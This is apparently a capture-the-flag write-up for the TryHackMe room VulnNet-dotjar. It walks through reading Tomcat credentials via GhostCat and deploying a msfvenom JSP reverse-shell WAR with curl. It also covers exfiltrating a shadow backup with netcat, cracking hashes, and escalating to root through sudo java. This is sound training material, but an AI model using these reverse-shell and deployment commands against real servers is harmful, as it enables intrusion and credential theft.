---
title: VulnNet-dotjar TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/1.png)

## Scanning
We scan with **nmap** all ports, scripts and software versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/2.png)

## Enumeration
On port 8080 we enumerate a web service with **Tomcat**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/3.png)

The **Tomcat** version is vulnerable to *"GhostCat"*, so using the following exploit we can exploit the vuln and read the credentials stored in *"WEB-INF/web.xml"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/4.png)

## Exploitation
We create a *.war file*
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=XX -f war -o revshell.war
```
We cannot access from the graphical interface, but we can upload our *.war file* using **curl**.

```bash
curl --user 'user:password' --upload-file m3.war "http://dotjar.thm:8080/manager/text/deploy?path=/m3"
```

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/5.png)

#### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/6.png)

We do a little reconnaissance, find a backup of the *"shadow"* file, transfer it to our kali with **netcat**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/7.png)

We crack the hashes with the **rockyou** dictionary and get the plain password of the user *"jdk-admin"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/8.png)

We authenticate as the user *"jdk-admin"*, we see that we have access to the user flag and we can also execute the **java binary** as root.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/9.png)

## Privilege Escalation
Very easy, we generate a *reverse shell* with the **msfvenom** tool and download it to the victim machine.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/10.png)

We run the malicious binary as **SUDO**, we will get a shell as root and we can read the flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/VulnNet-dotjar/11.png)




